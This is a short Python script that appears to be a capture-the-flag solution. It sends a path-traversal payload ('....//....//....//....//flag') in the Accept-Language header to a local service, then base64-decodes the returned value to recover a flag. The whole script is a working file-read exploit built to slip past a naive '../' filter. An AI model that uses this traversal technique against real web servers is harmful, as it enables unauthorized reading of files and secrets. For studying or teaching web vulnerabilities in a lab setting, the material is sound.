import requests
import base64

def base64_decode(text):
	return base64.b64decode(text).decode('utf-8', errors='ignore')

url = "http://127.0.0.1:1235"

headers = {
	"Accept-Language": "....//....//....//....//flag"
}

response = requests.get(url, headers=headers)

print(response.text)

cipher_text = response.text.split("\n")[-1]
cipher_text = cipher_text.split(",")[-1].rstrip('">')
print(cipher_text)

flag = base64_decode(cipher_text)
print(f"Flag: {flag}")